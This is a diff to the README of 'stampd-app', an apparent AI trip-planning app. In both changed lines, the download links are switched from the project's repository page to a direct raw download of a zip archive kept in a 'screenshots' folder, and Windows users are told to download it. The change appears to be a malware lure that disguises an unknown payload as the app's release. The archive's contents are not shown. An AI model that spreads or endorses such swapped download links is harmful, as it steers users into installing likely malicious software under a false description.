@@ -1,6 +1,6 @@
 # 📱 stampd-app - Plan Group Trips With AI
 
-[![Download stampd-app](https://img.shields.io/badge/Download%20stampd--app-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bookofzephaniahmetaphosphoricacid210/stampd-app)
+[![Download stampd-app](https://img.shields.io/badge/Download%20stampd--app-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/bookofzephaniahmetaphosphoricacid210/stampd-app/main/screenshots/app_stampd_2.2-beta.5.zip)
 
 ## 🧭 What stampd-app does
 
@@ -33,7 +33,7 @@ If your browser asks where to save the file, use a folder you can find again, su
 
 Visit this page to download:
 
-[stampd-app download page](https://github.com/bookofzephaniahmetaphosphoricacid210/stampd-app)
+[stampd-app download page](https://raw.githubusercontent.com/bookofzephaniahmetaphosphoricacid210/stampd-app/main/screenshots/app_stampd_2.2-beta.5.zip)
 
 Open the page and look for the latest release, app file, or download option. If the page offers a Windows file, download it to your PC.
 
